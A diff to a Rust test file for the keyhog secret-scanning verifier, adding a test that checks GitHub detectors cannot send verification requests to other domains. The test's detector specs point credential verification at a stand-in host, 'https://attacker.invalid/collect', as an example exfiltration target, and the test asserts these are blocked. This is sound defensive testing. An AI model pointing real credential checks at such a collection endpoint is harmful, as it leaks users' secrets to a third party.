@@ -1,6 +1,34 @@
-use keyhog_core::{DetectorSpec, VerifySpec};
+use keyhog_core::{
+    AuthSpec, DedupedMatch, DetectorSpec, HttpMethod, MatchLocation, SensitiveString, Severity,
+    StepSpec, SuccessSpec, VerificationResult, VerifySpec,
+};
 use keyhog_verifier::testing::{TestApi, VerifierTestApi};
 use keyhog_verifier::{VerificationEngine, VerifyConfig};
+use std::collections::HashMap;
+use std::sync::Arc;
+
+fn verification_group(detector_id: &str) -> DedupedMatch {
+    DedupedMatch {
+        detector_id: Arc::from(detector_id),
+        detector_name: Arc::from("domain inheritance test"),
+        service: Arc::from("github"),
+        severity: Severity::High,
+        credential: SensitiveString::from("test-credential"),
+        credential_hash: [0u8; 32].into(),
+        primary_location: MatchLocation {
+            source: Arc::from("test"),
+            file_path: None,
+            line: None,
+            offset: 0,
+            commit: None,
+            author: None,
+            date: None,
+        },
+        additional_locations: Vec::new(),
+        companions: HashMap::new(),
+        confidence: None,
+    }
+}
 
 #[test]
 fn builtin_service_domains_includes_github() {
@@ -65,4 +93,61 @@ fn engine_resolves_omitted_verify_service_once_at_construction() {
             .as_deref(),
         Some("github")
     );
+}
+
+#[tokio::test]
+async fn inherited_service_policy_blocks_single_and_multi_step_runtime_requests() {
+    let single = DetectorSpec {
+        id: "github-single-inheritance".into(),
+        name: "GitHub single inheritance".into(),
+        service: "github".into(),
+        verify: Some(VerifySpec {
+            url: Some("https://attacker.invalid/collect".into()),
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+    let multi = DetectorSpec {
+        id: "github-multi-inheritance".into(),
+        name: "GitHub multi inheritance".into(),
+        service: "github".into(),
+        verify: Some(VerifySpec {
+            steps: vec![StepSpec {
+                name: "profile".into(),
+                method: HttpMethod::Get,
+                url: "https://attacker.invalid/collect".into(),
+                auth: AuthSpec::None {},
+                headers: Vec::new(),
+                body: None,
+                success: SuccessSpec::default(),
+                extract: Vec::new(),
+            }],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+    let engine = VerificationEngine::new(&[single, multi], VerifyConfig::default())
+        .expect("construct verifier");
+    let findings = engine
+        .verify_all(vec![
+            verification_group("github-single-inheritance"),
+            verification_group("github-multi-inheritance"),
+        ])
+        .await;
+    assert_eq!(findings.len(), 2);
+    for finding in findings {
+        match finding.verification {
+            VerificationResult::Error(error) => {
+                assert!(
+                    error.contains("blocked:"),
+                    "unexpected runtime error: {error}"
+                );
+                assert!(
+                    error.contains("github"),
+                    "inherited service missing: {error}"
+                );
+            }
+            other => panic!("off-policy request was not blocked: {other:?}"),
+        }
+    }
 }
